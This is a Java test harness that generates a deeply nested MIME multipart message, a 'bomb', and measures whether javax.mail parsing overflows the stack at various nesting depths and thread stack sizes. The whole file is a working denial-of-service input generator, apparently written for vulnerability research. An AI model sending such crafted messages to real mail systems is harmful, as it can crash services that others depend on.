import javax.mail.*; import javax.mail.internet.*; import java.io.*; import java.util.Properties;
public class MatrixDos_javax {
  static volatile String outcome="?"; static volatile int maxDepth=0; static volatile long ms=0;
  static Session S;
  static void walk(Part p,int d) throws Exception { Object c=p.getContent();
    if(c instanceof Multipart){ if(d>maxDepth)maxDepth=d; Multipart m=(Multipart)c;
      for(int i=0;i<m.getCount();i++) walk(m.getBodyPart(i),d+1);} }
  static byte[] bomb(int n){ StringBuilder s=new StringBuilder("From: a@b.c\r\nSubject: x\r\nMIME-Version: 1.0\r\n");
    for(int i=0;i<n;i++) s.append("Content-Type: multipart/mixed; boundary=\"B"+i+"\"\r\n\r\n--B"+i+"\r\n");
    s.append("Content-Type: text/plain\r\n\r\npayload\r\n"); for(int i=n-1;i>=0;i--) s.append("--B"+i+"--\r\n");
    return s.toString().getBytes(); }
  public static void main(String[] a) throws Exception {
    String label=a[0]; int n=Integer.parseInt(a[1]); long stack=Long.parseLong(a[2]);
    S=Session.getDefaultInstance(new Properties(),null);
    // warm up handler/provider init so SOE lands in the recursion, not lazy init
    new MimeMessage(S,new ByteArrayInputStream(bomb(1))).getContent();
    final byte[] raw=bomb(n);
    Runnable r=()->{ long t0=System.currentTimeMillis();
      try{ MimeMessage m=new MimeMessage(S,new ByteArrayInputStream(raw)); walk(m,0); outcome="PARSED_OK"; }
      catch(StackOverflowError e){ outcome="StackOverflowError"; }
      catch(Throwable t){ outcome=t.getClass().getSimpleName(); }
      ms=System.currentTimeMillis()-t0; };
    Thread th=new Thread(null,r,"w",stack); th.start(); th.join();
    System.out.println(label+"\tnesting="+n+"\tstack="+(stack/1024)+"KB\t"+outcome+"\tdepth="+maxDepth+"\t"+ms+"ms");
  }
}
